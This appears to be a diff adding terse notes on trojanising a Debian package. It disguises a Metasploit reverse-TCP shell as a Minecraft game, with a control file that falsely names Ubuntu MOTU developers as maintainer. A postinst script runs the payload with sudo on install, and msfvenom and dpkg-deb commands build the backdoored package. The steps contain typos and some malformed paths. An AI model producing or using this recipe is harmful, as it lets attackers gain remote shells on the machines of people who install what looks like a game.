@@ -1,0 +1,28 @@
+download any deb package and change included files to install metasploit payload 
+
+### create a "control" file > 
+Package: .deb name
+Section: section will be placed
+Priority: optional
+Architecture: i386
+Maintainer: Ubuntu MOTU Developers <ubuntu-motu@lists.ubuntu.com>
+Descriptions: This is a minecraft game for linux 
+
+### create a postinstallation script (postinst)
+#!/bin/bash
+sudo chmod 2755 /usr/section/game_file && sudo /usr/section/game_file &
+sudo /usr/section/game & 
+
+### extracing deb files
+dpkg -x package.ded 
+mkdir DEBIAN
+cp control DEBIAN/
+cp postinst DEBIAN/
+chmod 755 postinst
+
+
+msfvenom -a x64 --platform linux -p /linux/x64/shell/reverse_tcp LHOST=ip LPORT=port -b "\x00" -f elf -o output/game_file
+
+
+
+dpkg-deb --build /foler/package/are/located/
